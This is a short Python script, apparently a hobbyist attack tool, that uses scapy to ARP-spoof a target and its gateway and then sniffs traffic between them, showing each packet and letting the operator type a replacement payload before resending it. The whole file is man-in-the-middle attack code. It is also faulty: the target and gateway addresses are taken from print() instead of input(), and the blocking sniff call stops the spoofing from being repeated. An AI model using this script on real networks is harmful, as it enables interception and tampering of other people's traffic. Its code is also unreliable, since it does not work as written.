from scapy.all import *

target_ip = print("Enter target's IP Address >>> ")
server_ip = print ("Enter gateway's IP Address")

def arp_spoof(target_ip, target_mac, gateway_ip, gateway_mac):
    # Craft the ARP response for the target
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(arp_response)
    # Craft the ARP response for the gateway
    arp_response = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    send(arp_response)

def intercept_packet(pkt):
    # Check if the packet is from target to server
    if IP in pkt and pkt[IP].src == target_ip and pkt[IP].dst == server_ip:
        print("Original packet: ")
        pkt.show()
        new_payload = input("Enter a new payload for the server request >>> ")
        pkt[Raw].load = new_payload.encode()
        print("Modified packet: ")
        pkt.show()
        send(pkt)
    # Check if the packet is from server to target
    elif IP in pkt and pkt[IP].src == server_ip and pkt[IP].dst == target_ip:
        print("Original packet: ")
        pkt.show()
        new_payload = input("Enter a new payload for the client request >>> ")
        pkt[Raw].load = new_payload.encode()
        print("Modified packet: ")
        pkt.show()
        send(pkt)
    else:
        print(" No packet available at the moment!")

if __name__ == "__main__":
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(server_ip)
    while True:
        arp_spoof(target_ip, target_mac, server_ip, gateway_mac)
        sniff(filter="ip", prn=intercept_packet)
